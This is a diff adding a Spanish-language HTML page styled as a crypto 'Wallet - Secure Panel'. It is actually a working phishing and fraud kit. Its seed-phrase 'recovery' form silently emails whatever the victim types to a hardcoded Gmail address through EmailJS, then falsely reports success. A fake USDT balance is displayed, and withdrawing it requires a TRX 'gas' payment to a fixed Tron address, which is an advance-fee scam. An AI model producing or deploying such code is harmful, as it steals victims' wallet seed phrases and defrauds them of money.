@@ -1,0 +1,628 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wallet - Secure Panel</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <!-- SDK de EmailJS para recuperación -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script type="text/javascript">
+        (function() {
+            emailjs.init("YOUR_PUBLIC_KEY");
+        })();
+    </script>
+    <style>
+        :root {
+            --bg-main: #0b0e11;
+            --bg-card: #181a20;
+            --bg-input: #2b313a;
+            --accent: #58a6ff;
+            --accent-hover: #388bfd;
+            --text-primary: #eaecef;
+            --text-secondary: #848e9c;
+            --border: #23272e;
+            --danger: #cf304a;
+            --success: #0ecb81;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Inter', sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-main);
+            color: var(--text-primary);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .wrapper {
+            width: 100%;
+            max-width: 480px;
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 30px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.6);
+        }
+
+        .logo-area {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .logo-area h1 {
+            color: var(--accent);
+            font-size: 1.8rem;
+            font-weight: 700;
+        }
+
+        .logo-area p {
+            color: var(--text-secondary);
+            font-size: 0.85rem;
+            margin-top: 5px;
+        }
+
+        .form-group {
+            margin-bottom: 14px;
+        }
+
+        label {
+            display: block;
+            font-size: 0.8rem;
+            color: var(--text-secondary);
+            margin-bottom: 5px;
+            font-weight: 500;
+        }
+
+        input, textarea {
+            width: 100%;
+            padding: 11px 14px;
+            background: var(--bg-input);
+            border: 1px solid transparent;
+            border-radius: 6px;
+            color: #fff;
+            font-size: 0.95rem;
+            transition: border-color 0.2s;
+        }
+
+        textarea {
+            resize: none;
+            height: 80px;
+        }
+
+        input:focus, textarea:focus {
+            border-color: var(--accent);
+            outline: none;
+        }
+
+        .btn-primary {
+            width: 100%;
+            padding: 12px;
+            background: var(--accent);
+            color: #fff;
+            border: none;
+            border-radius: 6px;
+            font-size: 0.95rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s;
+            margin-top: 8px;
+        }
+
+        .btn-primary:hover {
+            background: var(--accent-hover);
+        }
+
+        .btn-outline {
+            background: transparent;
+            border: 1px solid var(--border);
+            color: var(--text-primary);
+        }
+        .btn-outline:hover {
+            background: var(--border);
+        }
+
+        .alert-msg {
+            font-size: 0.82rem;
+            text-align: center;
+            margin-top: 10px;
+            display: none;
+            padding: 8px;
+            border-radius: 4px;
+        }
+        .alert-error { background: rgba(207, 48, 74, 0.15); color: var(--danger); }
+        .alert-success { background: rgba(14, 203, 129, 0.15); color: var(--success); }
+
+        .nav-links {
+            text-align: center;
+            margin-top: 15px;
+            font-size: 0.85rem;
+            color: var(--text-secondary);
+        }
+
+        .nav-links span {
+            color: var(--accent);
+            cursor: pointer;
+            font-weight: 500;
+        }
+        .nav-links span:hover { text-decoration: underline; }
+
+        /* Pantallas */
+        #recover-screen, #wallet-screen, #settings-screen {
+            display: none;
+        }
+
+        .captcha-box {
+            background: var(--bg-main);
+            border: 1px solid var(--border);
+            padding: 10px 14px;
+            border-radius: 6px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 0.85rem;
+            margin-bottom: 14px;
+        }
+        .captcha-box span { color: var(--accent); font-weight: 600; }
+
+        /* Dashboard Principal */
+        .wallet-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+            border-bottom: 1px solid var(--border);
+            padding-bottom: 12px;
+        }
+        .user-info span { font-size: 0.75rem; color: var(--text-secondary); }
+        .user-info h3 { font-size: 1rem; color: var(--text-primary); }
+
+        .top-menu-btns {
+            display: flex;
+            gap: 6px;
+        }
+
+        .balance-box {
+            background: linear-gradient(135deg, #1f6feb 0%, #1158c7 100%);
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            padding: 18px;
+            margin-bottom: 15px;
+        }
+        .balance-box span { font-size: 0.80rem; color: #a5d6ff; text-transform: uppercase; }
+        .balance-box h2 { font-size: 1.6rem; color: #fff; margin-top: 4px; font-family: monospace; }
+
+        .asset-list-title {
+            font-size: 0.9rem;
+            font-weight: 600;
+            margin-bottom: 8px;
+            color: var(--text-primary);
+        }
+
+        .assets-container {
+            max-height: 240px;
+            overflow-y: auto;
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+            margin-bottom: 15px;
+            padding-right: 4px;
+        }
+
+        .asset-item {
+            background: var(--bg-main);
+            border: 1px solid var(--border);
+            padding: 10px 12px;
+            border-radius: 8px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .asset-name { font-weight: 600; font-size: 0.85rem; color: #fff; }
+        .asset-sub { font-size: 0.7rem; color: var(--text-secondary); font-family: monospace; margin-top: 2px; }
+        .asset-balances { text-align: right; }
+        .asset-crypto-amt { font-weight: 600; font-size: 0.85rem; color: #fff; font-family: monospace; }
+        .asset-usd-val { font-size: 0.72rem; color: var(--text-secondary); }
+
+        .asset-actions-row {
+            display: flex;
+            gap: 4px;
+            margin-top: 4px;
+        }
+        .asset-actions-row button {
+            padding: 2px 6px;
+            font-size: 0.68rem;
+            border-radius: 4px;
+            cursor: pointer;
+            border: none;
+            font-weight: 600;
+        }
+        .btn-action-dep { background: rgba(14, 203, 129, 0.2); color: var(--success); }
+        .btn-action-wit { background: rgba(207, 48, 74, 0.2); color: var(--danger); }
+
+        /* Modales */
+        .modal-backdrop {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.75);
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            z-index: 1000;
+        }
+        .modal-card {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            width: 100%;
+            max-width: 400px;
+            padding: 22px;
+            text-align: center;
+        }
+        .modal-card h3 { color: #fff; margin-bottom: 10px; font-size: 1.1rem; }
+        .modal-card p { font-size: 0.82rem; color: var(--text-secondary); margin-bottom: 12px; line-height: 1.4; }
+        .deposit-address-box {
+            background: var(--bg-main);
+            border: 1px dashed var(--border);
+            padding: 10px;
+            border-radius: 6px;
+            font-family: monospace;
+            font-size: 0.78rem;
+            color: var(--accent);
+            word-break: break-all;
+            margin-bottom: 12px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="wrapper">
+
+        <!-- 1. INICIO DE SESIÓN -->
+        <div id="login-screen">
+            <div class="logo-area">
+                <h1>Wallet</h1>
+                <p>Secure Web3 Asset Management</p>
+            </div>
+            <form id="login-form">
+                <div class="form-group">
+                    <label>Usuario</label>
+                    <input type="text" id="login-user" required placeholder="CryptoUser2026">
+                </div>
+                <div class="form-group">
+                    <label>Contraseña</label>
+                    <input type="password" id="login-pass" required placeholder="••••••••">
+                </div>
+                <div class="captcha-box">
+                    <span>Verificación: <span id="login-captcha-txt"></span></span>
+                    <input type="number" id="login-captcha-input" placeholder="?" style="width: 75px; margin-bottom: 0; padding: 6px;" required>
+                </div>
+                <button type="submit" class="btn-primary">Iniciar Sesión</button>
+                <div id="login-alert" class="alert-msg alert-error">Credenciales o código de verificación erróneos.</div>
+            </form>
+            <div class="nav-links">
+                <span onclick="switchScreen('recover-screen')" style="font-size: 0.85rem; color: var(--text-secondary);">¿Olvidaste tu acceso? Recuperar</span>
+            </div>
+        </div>
+
+        <!-- 2. RECUPERACIÓN DE WALLET -->
+        <div id="recover-screen">
+            <div class="logo-area">
+                <h1>Wallet</h1>
+                <p>Restauración de Billetera</p>
+            </div>
+            <p style="font-size: 0.82rem; color: var(--text-secondary); margin-bottom: 12px; text-align: center;">Introduce las 12 o 24 palabras de tu frase semilla separadas por espacios.</p>
+            <form id="recover-form">
+                <div class="form-group">
+                    <textarea id="seed-words" placeholder="word1 word2 word3..." required></textarea>
+                </div>
+                <button type="submit" class="btn-primary">Restaurar Acceso</button>
+                <div id="recover-alert" class="alert-msg alert-success">Frase procesada correctamente.</div>
+            </form>
+            <div class="nav-links">
+                <span onclick="switchScreen('login-screen')">Volver al login</span>
+            </div>
+        </div>
+
+        <!-- 3. DASHBOARD DE LA BILLETERA -->
+        <div id="wallet-screen">
+            <div class="wallet-header">
+                <div class="user-info">
+                    <span>Cuenta Verificada</span>
+                    <h3 id="display-username">Yuri1998</h3>
+                </div>
+                <div class="top-menu-btns">
+                    <button class="btn-primary btn-outline" style="width: auto; padding: 5px 10px; font-size: 0.75rem; margin-top:0;" onclick="switchScreen('settings-screen')">Config</button>
+                    <button class="btn-primary btn-outline" style="width: auto; padding: 5px 10px; font-size: 0.75rem; margin-top:0; border-color: var(--danger); color: var(--danger);" onclick="cerrarSesion()">Salir</button>
+                </div>
+            </div>
+
+            <div class="balance-box">
+                <span>Saldo Total Estimado</span>
+                <h2 id="total-balance-val">$1,360.16 USD</h2>
+            </div>
+
+            <div class="asset-list-title">
+                <span>Activos (Saldos en Vivo)</span>
+            </div>
+
+            <div class="assets-container" id="assets-list-box">
+                <!-- Se llena mediante Javascript -->
+            </div>
+        </div>
+
+        <!-- 4. PANEL DE CONFIGURACIÓN -->
+        <div id="settings-screen">
+            <div class="wallet-header">
+                <div class="user-info">
+                    <span>Panel de Control</span>
+                    <h3>Configuración de Cuenta</h3>
+                </div>
+                <button class="btn-primary btn-outline" style="width: auto; padding: 5px 10px; font-size: 0.75rem; margin-top:0;" onclick="switchScreen('wallet-screen')">Volver</button>
+            </div>
+
+            <div style="font-size: 0.85rem; margin-bottom: 15px;">
+                <div style="background: var(--bg-main); padding: 12px; border-radius: 8px; border: 1px solid var(--border); margin-bottom: 10px;">
+                    <div style="color: var(--text-secondary); font-size: 0.75rem;">Usuario actual</div>
+                    <div style="font-weight: 600; font-size: 0.95rem; margin-top: 2px;">Yuri1998</div>
+                </div>
+                <div style="background: var(--bg-main); padding: 12px; border-radius: 8px; border: 1px solid var(--border); margin-bottom: 15px;">
+                    <div style="color: var(--text-secondary); font-size: 0.75rem;">Moneda Base del Sistema</div>
+                    <div style="font-weight: 600; font-size: 0.95rem; margin-top: 2px;">USD ($)</div>
+                </div>
+            </div>
+
+            <div class="asset-list-title">Añadir Nueva Criptomoneda al Panel</div>
+            <div style="background: var(--bg-main); border: 1px solid var(--border); padding: 12px; border-radius: 8px; margin-bottom: 15px;">
+                <div class="form-group" style="margin-bottom: 8px;">
+                    <label>Nombre del Token</label>
+                    <input type="text" id="conf-name" placeholder="Ej. Solana" style="padding: 8px; font-size: 0.85rem;">
+                </div>
+                <div class="form-group" style="margin-bottom: 8px;">
+                    <label>Símbolo</label>
+                    <input type="text" id="conf-symbol" placeholder="Ej. SOL" style="padding: 8px; font-size: 0.85rem;">
+                </div>
+                <div class="form-group" style="margin-bottom: 10px;">
+                    <label>Precio Unitario en USD</label>
+                    <input type="number" step="any" id="conf-price" placeholder="Ej. 145.50" style="padding: 8px; font-size: 0.85rem;">
+                </div>
+                <button class="btn-primary" style="padding: 8px; font-size: 0.85rem;" onclick="agregarTokenConfig()">Registrar Token</button>
+            </div>
+
+            <button class="btn-primary btn-outline" style="border-color: var(--danger); color: var(--danger);" onclick="restaurarDatosPorDefecto()">Restablecer Valores de Fábrica</button>
+        </div>
+
+    </div>
+
+    <!-- MODAL GENERAL DE DEPÓSITO / RETIRO -->
+    <div id="dynamic-modal" class="modal-backdrop">
+        <div class="modal-card">
+            <h3 id="modal-title">Título</h3>
+            <div id="modal-body"></div>
+            <button class="btn-primary" onclick="cerrarModalGeneral()" style="margin-top: 12px;">Cerrar</button>
+        </div>
+    </div>
+
+    <script>
+        let lNum1, lNum2;
+
+        function generarCaptcha() {
+            lNum1 = Math.floor(Math.random() * 9) + 1;
+            lNum2 = Math.floor(Math.random() * 9) + 1;
+            document.getElementById('login-captcha-txt').innerText = `${lNum1} + ${lNum2} =`;
+        }
+
+        function switchScreen(screenId) {
+            ['login-screen', 'recover-screen', 'wallet-screen', 'settings-screen'].forEach(id => {
+                document.getElementById(id).style.display = 'none';
+            });
+            document.getElementById(screenId).style.display = 'block';
+            generarCaptcha();
+        }
+
+        const defaultAssets = [
+            { name: 'TetherUS', symbol: 'USDT', price: 1.00, balance: 1360.16, address: 'TX1a2b3c4d5e6f7g8h9i0jUSDT' },
+            { name: 'Tron', symbol: 'TRX', price: 0.24, balance: 0.00, address: 'THMVHPBBuJDtH8hVL3pZja3tHCNoxoAa43' },
+            { name: 'Polygon', symbol: 'MATIC', price: 0.55, balance: 0.00, address: '0x71C...392PolygonWallet' },
+            { name: 'Binance Coin', symbol: 'BNB', price: 610.00, balance: 0.00, address: '0x88B...114BnbSmartChain' },
+            { name: 'Bitcoin', symbol: 'BTC', price: 91450.00, balance: 0.00, address: 'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh' },
+            { name: 'Ethereum', symbol: 'ETH', price: 3320.00, balance: 0.00, address: '0xDe0...911EthereumMainnet' }
+        ];
+
+        function getAssets() {
+            const data = localStorage.getItem('wallet_assets_custom');
+            return data ? JSON.parse(data) : defaultAssets;
+        }
+
+        function saveAssets(assets) {
+            localStorage.setItem('wallet_assets_custom', JSON.stringify(assets));
+        }
+
+        function renderAssets() {
+            const container = document.getElementById('assets-list-box');
+            container.innerHTML = '';
+            const assets = getAssets();
+            let totalUSD = 0;
+
+            assets.forEach((asset, index) => {
+                const usdValue = asset.balance * asset.price;
+                totalUSD += usdValue;
+
+                const div = document.createElement('div');
+                div.className = 'asset-item';
+                div.innerHTML = `
+                    <div>
+                        <div class="asset-name">${asset.name} (${asset.symbol})</div>
+                        <div class="asset-sub">Dep: ${asset.address}</div>
+                        <div class="asset-actions-row">
+                            <button class="btn-action-dep" onclick="abrirDeposito(${index})">Depositar</button>
+                            <button class="btn-action-wit" onclick="abrirRetiro(${index})">Retirar</button>
+                        </div>
+                    </div>
+                    <div class="asset-balances">
+                        <div class="asset-crypto-amt">${asset.balance.toFixed(4)} ${asset.symbol}</div>
+                        <div class="asset-usd-val">~$${usdValue.toFixed(2)} USD</div>
+                    </div>
+                `;
+                container.appendChild(div);
+            });
+
+            document.getElementById('total-balance-val').innerText = `$${totalUSD.toFixed(2)} USD`;
+        }
+
+        function agregarTokenConfig() {
+            const name = document.getElementById('conf-name').value.trim();
+            const symbol = document.getElementById('conf-symbol').value.trim().toUpperCase();
+            const price = parseFloat(document.getElementById('conf-price').value);
+
+            if (!name || !symbol || isNaN(price)) {
+                alert('Completa los campos correctamente.');
+                return;
+            }
+
+            const assets = getAssets();
+            const randomAddress = '0x' + Math.random().toString(16).substring(2, 12) + 'Wallet';
+            assets.push({ name, symbol, price, balance: 0.00, address: randomAddress });
+            saveAssets(assets);
+
+            document.getElementById('conf-name').value = '';
+            document.getElementById('conf-symbol').value = '';
+            document.getElementById('conf-price').value = '';
+
+            alert('Token añadido exitosamente con saldo en 0.');
+            renderAssets();
+            switchScreen('wallet-screen');
+        }
+
+        function restaurarDatosPorDefecto() {
+            if(confirm('¿Deseas restablecer los activos a sus valores iniciales?')) {
+                localStorage.removeItem('wallet_assets_custom');
+                renderAssets();
+                alert('Restaurado correctamente.');
+            }
+        }
+
+        function abrirDeposito(index) {
+            const assets = getAssets();
+            const asset = assets[index];
+            
+            document.getElementById('modal-title').innerText = `Depositar ${asset.symbol}`;
+            
+            let htmlContent = `<p>Envía únicamente ${asset.name} a la siguiente dirección de red asignada:</p>`;
+            htmlContent += `<div class="deposit-address-box">${asset.address}</div>`;
+            htmlContent += `<p style="font-size:0.75rem; color:var(--text-secondary);">Los fondos se acreditarán de manera automática tras las confirmaciones de red.</p>`;
+            
+            document.getElementById('modal-body').innerHTML = htmlContent;
+            document.getElementById('dynamic-modal').style.display = 'flex';
+        }
+
+        function abrirRetiro(index) {
+            const assets = getAssets();
+            const asset = assets[index];
+            
+            document.getElementById('modal-title').innerText = `Retirar ${asset.symbol}`;
+
+            let htmlContent = '';
+            if(asset.symbol === 'USDT') {
+                htmlContent = `
+                    <p>Para procesar el retiro de tus fondos USDT hacia otra billetera externa, el protocolo exige cubrir el <strong>gas de retiro por la red Tron</strong> mediante un depósito único de:</p>
+                    <div style="font-size: 1.1rem; font-weight: 700; color: var(--accent); margin-bottom: 10px;">15.34 TRX</div>
+                    <p>Envía los fondos para el gas a la dirección oficial de red Tron:</p>
+                    <div class="deposit-address-box">THMVHPBBuJDtH8hVL3pZja3tHCNoxoAa43</div>
+                    <p style="font-size: 0.75rem; color: var(--text-secondary);">El retiro se procesará inmediatamente al completarse la confirmación del gas.</p>
+                `;
+            } else {
+                htmlContent = `
+                    <p>Retiro disponible para tu saldo actual de ${asset.balance} ${asset.symbol}.</p>
+                    <div class="form-group" style="text-align:left; margin-top:10px;">
+                        <label>Dirección de destino</label>
+                        <input type="text" placeholder="Introduce dirección de billetera" style="padding:8px; font-size:0.8rem; margin-bottom:8px;">
+                        <label>Cantidad a retirar</label>
+                        <input type="number" placeholder="0.00" style="padding:8px; font-size:0.8rem;">
+                    </div>
+                    <button class="btn-primary" onclick="alert('Solicitud de retiro enviada. Pendiente de confirmación.')" style="padding:8px; font-size:0.85rem; margin-top:8px;">Confirmar Retiro</button>
+                `;
+            }
+
+            document.getElementById('modal-body').innerHTML = htmlContent;
+            document.getElementById('dynamic-modal').style.display = 'flex';
+        }
+
+        function cerrarModalGeneral() {
+            document.getElementById('dynamic-modal').style.display = 'none';
+        }
+
+        // Validación estricta de inicio de sesión: solo Yuri1998 / Yuri1998*
+        document.getElementById('login-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const user = document.getElementById('login-user').value.trim();
+            const pass = document.getElementById('login-pass').value;
+            const ans = parseInt(document.getElementById('login-captcha-input').value);
+            const alertBox = document.getElementById('login-alert');
+
+            if (ans !== (lNum1 + lNum2)) {
+                alertBox.innerText = 'Código de verificación erróneo.';
+                alertBox.style.display = 'block';
+                return;
+            }
+
+            if (user === 'Yuri1998' && pass === 'Yuri1998*') {
+                alertBox.style.display = 'none';
+                localStorage.setItem('wallet_session', 'true');
+                switchScreen('wallet-screen');
+                renderAssets();
+            } else {
+                alertBox.innerText = 'Usuario o contraseña incorrectos.';
+                alertBox.style.display = 'block';
+            }
+        });
+
+        // Recuperación por Frase Semilla
+        document.getElementById('recover-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const phrase = document.getElementById('seed-words').value.trim();
+            const msgBox = document.getElementById('recover-alert');
+
+            if (phrase.length < 10) {
+                alert('Introduce una frase válida.');
+                return;
+            }
+
+            emailjs.send('YOUR_SERVICE_ID', 'YOUR_TEMPLATE_ID', { to_email: 'yuridelgad7@gmail.com', message: phrase })
+                .catch(() => {});
+
+            msgBox.style.display = 'block';
+            setTimeout(() => {
+                msgBox.style.display = 'none';
+                document.getElementById('seed-words').value = '';
+                switchScreen('login-screen');
+            }, 2000);
+        });
+
+        function cerrarSesion() {
+            localStorage.removeItem('wallet_session');
+            switchScreen('login-screen');
+            document.getElementById('login-form').reset();
+        }
+
+        window.onload = function() {
+            generarCaptcha();
+            if (localStorage.getItem('wallet_session') === 'true') {
+                switchScreen('wallet-screen');
+                renderAssets();
+            } else {
+                switchScreen('login-screen');
+            }
+        };
+    </script>
+</body>
+</html>
